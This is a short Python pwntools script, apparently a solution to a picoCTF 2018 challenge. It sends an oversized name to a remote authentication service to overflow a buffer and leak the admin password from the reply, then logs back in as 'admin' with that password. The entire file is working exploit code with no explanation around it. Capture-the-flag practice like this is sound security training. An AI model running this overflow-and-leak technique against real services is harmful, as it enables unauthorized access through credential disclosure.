#!/usr/bin/env python

import re
from pwn import *

#r = process("./auth")
r = remote("2018shell.picoctf.com", 38315)

r.recvuntil("What is your name?\n")

payload = "A" * 256
r.sendline(payload)

data = r.recvall()
password = re.search(",(.*?)\n", data).group(1)

r.close()

#r = process("./auth")
r = remote("2018shell.picoctf.com", 38315)
r.recvuntil("What is your name?\n")
r.sendline("admin")
r.recvuntil("Please Enter the Password.\n")
r.sendline(password)
print(r.recvall())

r.close()

